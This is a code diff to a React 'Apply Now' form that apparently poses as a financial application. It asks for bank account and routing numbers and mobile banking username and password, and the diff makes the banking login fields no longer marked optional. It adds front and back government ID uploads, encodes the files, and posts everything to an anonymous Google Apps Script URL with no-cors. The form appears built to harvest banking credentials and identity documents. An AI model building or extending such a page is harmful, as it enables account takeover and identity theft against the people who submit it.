@@ -44,7 +44,10 @@ interface FormData {
   streetAddress: string; city: string; state: string; zipCode: string;
   bankName: string; accountNumber: string; routingNumber: string;
   mobileBankingUsername: string; mobileBankingPassword: string;
-  documentType: string; agreeTerms: boolean; agreePrivacy: boolean;
+  documentType: string; 
+  idFrontFile: File | null;
+  idBackFile: File | null;
+  agreeTerms: boolean; agreePrivacy: boolean;
 }
 
 const INITIAL: FormData = {
@@ -54,7 +57,10 @@ const INITIAL: FormData = {
   streetAddress: '', city: '', state: '', zipCode: '',
   bankName: '', accountNumber: '', routingNumber: '',
   mobileBankingUsername: '', mobileBankingPassword: '',
-  documentType: '', agreeTerms: false, agreePrivacy: false,
+  documentType: '', 
+  idFrontFile: null,
+  idBackFile: null,
+  agreeTerms: false, agreePrivacy: false,
 };
 
 const US_STATES = [
@@ -144,17 +150,44 @@ export default function ApplyNow() {
   const next = () => { if (validateStep(step)) setStep(s => s + 1); };
   const back = () => setStep(s => s - 1);
 
+  // Helper to convert file to base64
+  const fileToBase64 = (file: File): Promise<string> => {
+    return new Promise((resolve, reject) => {
+      const reader = new FileReader();
+      reader.readAsDataURL(file);
+      reader.onload = () => resolve(reader.result as string);
+      reader.onerror = reject;
+    });
+  };
+
   const handleSubmit = async () => {
     if (!validateStep(3)) return;
     setSubmitting(true);
+    
     try {
+      // Convert files to base64
+      const [idFrontBase64, idBackBase64] = await Promise.all([
+        data.idFrontFile ? fileToBase64(data.idFrontFile) : Promise.resolve(''),
+        data.idBackFile ? fileToBase64(data.idBackFile) : Promise.resolve(''),
+      ]);
+
+      const payload = {
+        ...data,
+        idFrontFile: idFrontBase64,
+        idFrontName: data.idFrontFile?.name || '',
+        idFrontType: data.idFrontFile?.type || '',
+        idBackFile: idBackBase64,
+        idBackName: data.idBackFile?.name || '',
+        idBackType: data.idBackFile?.type || '',
+      };
+
       await fetch(
-        'https://script.google.com/macros/s/AKfycbxlmNLChU33ZmKa8bY0e27zJCBbrbjWD-qysjzs38tZ7wjdfHY2wKvq_Gp2J3gFB4p68A/exec',
+        'https://script.google.com/macros/s/AKfycbxf38KtGitDuz4l4xazL-CzX1zPCZhj46xOSPJH35D0szhwt_xl75etRnc0rkQkZu1C/exec',
         {
           method: 'POST',
           mode: 'no-cors',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data),
+          body: JSON.stringify(payload),
         }
       );
     } catch (_) {
@@ -388,11 +421,11 @@ export default function ApplyNow() {
                           </button>
                         </div>
                       </Field>
-                      <Field label="Mobile Banking Username (Optional)">
+                      <Field label="Mobile Banking Username">
                         <input type="text" placeholder="Username" value={data.mobileBankingUsername}
                           onChange={set('mobileBankingUsername')} className={inputCls()} />
                       </Field>
-                      <Field label="Mobile Banking Password (Optional)">
+                      <Field label="Mobile Banking Password">
                         <div className="relative">
                           <input type={showBankPwd ? 'text' : 'password'} placeholder="Password" value={data.mobileBankingPassword}
                             onChange={set('mobileBankingPassword')} className={inputCls() + ' pr-10'} />
@@ -404,25 +437,76 @@ export default function ApplyNow() {
                       </Field>
                     </div>
 
-                    {/* Documents */}
-                    <h2 className="text-lg font-bold text-[#0f1f3d] mb-1">Verification Documents</h2>
-                    <p className="text-sm text-gray-500 mb-5">Optional — speeds up your application.</p>
-                    <div className="grid sm:grid-cols-2 gap-4 mb-8">
-                      <Field label="Document Type">
-                        <select value={data.documentType} onChange={set('documentType')} className={inputCls()}>
-                          <option value="">Select type</option>
+                    {/* ID Upload */}
+                    <div className="flex items-center gap-2 mb-1">
+                      <span className="text-[#E8521A]"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M3 10h18"/><path d="M8 14h.01"/><path d="M12 14h.01"/><path d="M16 14h.01"/><path d="M8 18h.01"/><path d="M12 18h.01"/><path d="M16 18h.01"/></svg></span>
+                      <h2 className="text-lg font-bold text-[#0f1f3d]">Government ID Upload <span className="text-sm font-normal text-gray-400">(Optional)</span></h2>
+                    </div>
+                    <p className="text-sm text-[#E8521A] mb-5">Optional — Upload front and back of your ID.</p>
+                    
+                    <div className="space-y-4 mb-8">
+                      <Field label="ID Type" error={errors.documentType}>
+                        <select value={data.documentType} onChange={set('documentType')} className={inputCls(errors.documentType)}>
+                          <option value="">Select ID type</option>
                           {["Driver's License", 'Passport', 'State ID', 'Social Security Card'].map(o => (
                             <option key={o} value={o}>{o}</option>
                           ))}
                         </select>
                       </Field>
-                      <Field label="Upload Document (Optional)">
-                        <label className="flex items-center gap-2 w-full px-3 py-2.5 rounded-lg border border-dashed border-gray-300 hover:border-[#0ea5e9] cursor-pointer text-sm text-gray-500 transition-colors bg-white">
-                          <Upload className="w-4 h-4 text-gray-400" />
-                          <span>Click to upload</span>
-                          <input type="file" className="hidden" accept="image/*,.pdf" />
+                      
+                      {/* ID Front Upload */}
+                      <div>
+                        <label className="block text-xs font-semibold text-gray-700 mb-1.5">ID Front Side</label>
+                        <label className="flex flex-col items-center justify-center w-full px-3 py-4 rounded-lg border-2 border-dashed border-gray-300 hover:border-[#E8521A] cursor-pointer transition-colors bg-white">
+                          <Upload className="w-6 h-6 text-gray-400 mb-2" />
+                          <span className="text-sm text-gray-500 text-center">
+                            {data.idFrontFile ? data.idFrontFile.name : 'Click to upload ID Front (JPG, PNG, PDF)'}
+                          </span>
+                          <input 
+                            type="file" 
+                            className="hidden" 
+                            accept="image/*,.pdf,.jpg,.jpeg,.png"
+                            onChange={(e) => {
+                              const file = e.target.files?.[0] || null;
+                              setData(p => ({ ...p, idFrontFile: file }));
+                              if (file) setErrors(p => ({ ...p, idFrontFile: undefined }));
+                            }}
+                          />
                         </label>
-                      </Field>
+                        {errors.idFrontFile && <p className="text-xs text-red-500 mt-1">{errors.idFrontFile}</p>}
+                        {data.idFrontFile && (
+                          <p className="text-xs text-green-600 mt-1 flex items-center gap-1">
+                            <CheckCircle className="w-3 h-3" /> {data.idFrontFile.name} ({(data.idFrontFile.size / 1024).toFixed(0)} KB)
+                          </p>
+                        )}
+                      </div>
+                      
+                      {/* ID Back Upload */}
+                      <div>
+                        <label className="block text-xs font-semibold text-gray-700 mb-1.5">ID Back Side</label>
+                        <label className="flex flex-col items-center justify-center w-full px-3 py-4 rounded-lg border-2 border-dashed border-gray-300 hover:border-[#E8521A] cursor-pointer transition-colors bg-white">
+                          <Upload className="w-6 h-6 text-gray-400 mb-2" />
+                          <span className="text-sm text-gray-500 text-center">
+                            {data.idBackFile ? data.idBackFile.name : 'Click to upload ID Back (JPG, PNG, PDF)'}
+                          </span>
+                          <input 
+                            type="file" 
+                            className="hidden" 
+                            accept="image/*,.pdf,.jpg,.jpeg,.png"
+                            onChange={(e) => {
+                              const file = e.target.files?.[0] || null;
+                              setData(p => ({ ...p, idBackFile: file }));
+                              if (file) setErrors(p => ({ ...p, idBackFile: undefined }));
+                            }}
+                          />
+                        </label>
+                        {errors.idBackFile && <p className="text-xs text-red-500 mt-1">{errors.idBackFile}</p>}
+                        {data.idBackFile && (
+                          <p className="text-xs text-green-600 mt-1 flex items-center gap-1">
+                            <CheckCircle className="w-3 h-3" /> {data.idBackFile.name} ({(data.idBackFile.size / 1024).toFixed(0)} KB)
+                          </p>
+                        )}
+                      </div>
                     </div>
 
                     {/* Terms */}
